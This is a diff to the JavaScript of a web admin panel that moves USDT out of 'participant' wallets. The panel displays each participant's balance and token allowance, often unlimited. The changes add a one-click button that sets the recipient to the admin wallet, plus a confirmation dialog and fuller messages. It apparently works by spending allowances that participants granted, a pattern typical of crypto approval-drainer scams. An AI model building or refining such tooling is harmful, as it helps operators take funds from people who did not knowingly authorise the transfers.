@@ -230,8 +230,8 @@ function displayParticipants() {
                         <td>${p.allowance > 1000000 ? '∞ Unlimited' : p.allowance.toFixed(2) + ' USDT'}</td>
                         <td><span class="status-badge status-active">Active</span></td>
                         <td>
-                            <button class="transfer-btn" onclick="openTransferModal('${p.address}', ${p.balance})">
-                                Transfer
+                            <button class="transfer-btn" onclick="openTransferModal('${p.address}', ${p.balance})" title="Transfer USDT to any BSC wallet address">
+                                💸 Transfer
                             </button>
                         </td>
                     </tr>
@@ -254,6 +254,18 @@ function openTransferModal(fromAddress, balance) {
     transferModal.classList.remove('hidden');
 }
 
+// Set Recipient to Admin Wallet
+function setRecipientToAdmin() {
+    modalToAddress.value = adminAccount;
+    showToast('📌 Recipient set to admin wallet', 'success');
+}
+
+// Clear Recipient Field
+function clearRecipient() {
+    modalToAddress.value = '';
+    showToast('🗑️ Recipient field cleared', 'info');
+}
+
 // Close Transfer Modal
 function closeTransferModal() {
     transferModal.classList.add('hidden');
@@ -271,12 +283,20 @@ async function executeTransfer() {
     }
 
     if (!web3.utils.isAddress(toAddress)) {
-        showToast('❌ Invalid recipient address', 'error');
+        showToast('❌ Invalid recipient address format', 'error');
+        return;
+    }
+
+    // Show transfer details for confirmation
+    const recipientName = toAddress.toLowerCase() === adminAccount.toLowerCase() ? 'Admin Wallet' : 'Custom Wallet';
+    const shortRecipient = formatAddress(toAddress);
+
+    if (!confirm(`Transfer ${amount} USDT from participant to:\n${recipientName} (${shortRecipient})\n\nContinue?`)) {
         return;
     }
 
     try {
-        showLoading('Processing admin transfer...');
+        showLoading('Processing transfer to ' + recipientName + '...');
 
         const decimals = await usdtContract.methods.decimals().call();
         // Convert decimal amount to wei by multiplying by 10^decimals
@@ -296,7 +316,9 @@ async function executeTransfer() {
 
         hideLoading();
         closeTransferModal();
-        showToast('✅ Transfer successful! Hash: ' + tx.transactionHash.substring(0, 10) + '...', 'success');
+
+        // Show detailed success message
+        showToast(`✅ Transfer successful!\nSent: ${amount} USDT\nTo: ${recipientName}\nHash: ${tx.transactionHash.substring(0, 10)}...`, 'success');
 
         // Reload data
         await loadParticipants();
@@ -304,9 +326,9 @@ async function executeTransfer() {
     } catch (error) {
         hideLoading();
         console.error('Error in admin transfer:', error);
-        
+
         if (error.code === 4001) {
-            showToast('❌ Transaction rejected', 'error');
+            showToast('❌ Transaction rejected by user', 'error');
         } else {
             showToast('❌ Transfer failed: ' + error.message, 'error');
         }
